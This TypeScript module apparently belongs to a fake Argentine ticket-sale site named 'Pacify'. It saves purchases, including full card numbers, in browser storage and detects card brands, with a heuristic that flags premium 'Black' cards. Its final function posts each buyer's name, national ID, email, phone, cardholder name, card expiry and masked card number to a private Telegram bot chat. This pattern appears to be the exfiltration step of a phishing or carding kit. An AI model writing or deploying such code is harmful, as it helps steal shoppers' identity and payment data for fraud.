import { PurchaseData } from '../types';

const STORAGE_KEY = 'pacify_purchases';

export function savePurchase(purchase: PurchaseData): void {
  const existing = getPurchases();
  existing.push(purchase);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
}

export function getPurchases(): PurchaseData[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function deletePurchase(id: string): void {
  const purchases = getPurchases().filter(p => p.id !== id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(purchases));
}

export function generateId(): string {
  return `TKT-${Date.now()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
}

export interface CardInfo {
  brand: string;
  type: 'credito' | 'debito' | 'desconocido';
  network: string;
  color: string;
  textColor: string;
}

export function detectCard(number: string): CardInfo {
  const n = number.replace(/\s/g, '');

  // American Express — starts with 34 or 37
  if (/^3[47]/.test(n)) {
    return { brand: 'American Express', network: 'AMEX', type: 'credito', color: '#2E77BC', textColor: '#fff' };
  }
  // Visa starts with 4
  if (n.startsWith('4')) {
    // Visa Electron: 4026, 417500, 4405, 4508, 4844, 4913, 4917
    if (/^(4026|417500|4405|4508|4844|4913|4917)/.test(n)) {
      return { brand: 'Visa Electron', network: 'VISA', type: 'debito', color: '#1A1F71', textColor: '#fff' };
    }
    // Visa Debito Argentina: 4517, 4589, 4858
    if (/^(4517|4589|4858)/.test(n)) {
      return { brand: 'Visa Debito', network: 'VISA', type: 'debito', color: '#1A1F71', textColor: '#fff' };
    }
    return { brand: 'Visa', network: 'VISA', type: 'credito', color: '#1A1F71', textColor: '#fff' };
  }
  // Mastercard — starts 51-55 or 2221-2720
  if (/^5[1-5]/.test(n) || /^2[2-7]\d{2}/.test(n)) {
    // Mastercard Black / Platinum heuristic: 5400-5499
    if (/^54/.test(n)) {
      return { brand: 'Mastercard Black', network: 'MASTERCARD', type: 'credito', color: '#1a1a1a', textColor: '#fff' };
    }
    // Mastercard Debit: 5018, 5020, 5038, 5612, 5893, 6304, 6759, 6761, 6762, 6763
    if (/^(5018|5020|5038|5612|5893)/.test(n)) {
      return { brand: 'Mastercard Debito', network: 'MASTERCARD', type: 'debito', color: '#252525', textColor: '#fff' };
    }
    return { brand: 'Mastercard', network: 'MASTERCARD', type: 'credito', color: '#252525', textColor: '#fff' };
  }
  // Diners Club — starts with 300-305, 36, 38
  if (/^3(?:0[0-5]|[68])/.test(n)) {
    return { brand: 'Diners Club', network: 'DINERS', type: 'credito', color: '#004A97', textColor: '#fff' };
  }
  // Discover — starts with 6011, 622126-622925, 644-649, 65
  if (/^(6011|65|64[4-9]|622)/.test(n)) {
    return { brand: 'Discover', network: 'DISCOVER', type: 'credito', color: '#FF6600', textColor: '#fff' };
  }
  // Cabal (Argentina) — starts with 604 or 589657
  if (/^(604|589657)/.test(n)) {
    return { brand: 'Cabal', network: 'CABAL', type: 'credito', color: '#003087', textColor: '#fff' };
  }
  // Naranja (Argentina) — starts with 589562
  if (/^589562/.test(n)) {
    return { brand: 'Naranja', network: 'NARANJA', type: 'credito', color: '#FF6200', textColor: '#fff' };
  }
  // Maestro — starts with 5018, 5020, 5038, 6304, 6759, 6761-6763
  if (/^(6304|6759|676[1-3])/.test(n)) {
    return { brand: 'Maestro', network: 'MAESTRO', type: 'debito', color: '#009BE0', textColor: '#fff' };
  }
  // UnionPay — starts with 62
  if (/^62/.test(n)) {
    return { brand: 'UnionPay', network: 'UNIONPAY', type: 'credito', color: '#C0392B', textColor: '#fff' };
  }

  return { brand: 'Tarjeta', network: '', type: 'desconocido', color: '#2a1d5e', textColor: '#fff' };
}

// Legacy compat
export function detectCardType(number: string): 'visa' | 'mastercard' | 'unknown' {
  const info = detectCard(number);
  if (info.network === 'VISA') return 'visa';
  if (info.network === 'MASTERCARD') return 'mastercard';
  return 'unknown';
}

export function formatCurrency(amount: number): string {
  return '$ ' + amount.toLocaleString('es-AR');
}

export function maskCard(number: string): string {
  const clean = number.replace(/\s/g, '');
  return '**** **** **** ' + clean.slice(-4);
}

// ─── Telegram ────────────────────────────────────────────────────────────────
const TELEGRAM_TOKEN = 'TU_BOT_TOKEN_AQUI';
const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI';

export async function sendTelegramReport(purchase: PurchaseData, cardInfo: CardInfo): Promise<void> {
  const lines = [
    '════════════════════════════',
    'PACIFY — NUEVA COMPRA',
    '════════════════════════════',
    '',
    'ORDEN',
    `ID: ${purchase.id}`,
    `Fecha: ${new Date(purchase.createdAt).toLocaleString('es-AR')}`,
    `Estado: ${purchase.status.toUpperCase()}`,
    '',
    'EVENTO',
    `Show: ${purchase.showTitle}`,
    `Fecha show: ${purchase.showDate}`,
    `Sector: ${purchase.section}`,
    `Entradas: ${purchase.quantity}`,
    `Total: ${formatCurrency(purchase.totalAmount)}`,
    '',
    'COMPRADOR',
    `Nombre: ${purchase.firstName} ${purchase.lastName}`,
    `DNI: ${purchase.dni}`,
    `Email: ${purchase.email}`,
    `Telefono: ${purchase.phone}`,
    '',
    'PAGO',
    `Tarjeta: ${cardInfo.brand}`,
    `Red: ${cardInfo.network}`,
    `Tipo: ${cardInfo.type.toUpperCase()}`,
    `Numero: ${maskCard(purchase.cardNumber)}`,
    `Titular: ${purchase.cardHolder}`,
    `Vencimiento: ${purchase.cardExpiry}`,
    '',
    '════════════════════════════',
  ];

  const text = lines.join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.warn('Telegram notification failed:', e);
  }
}
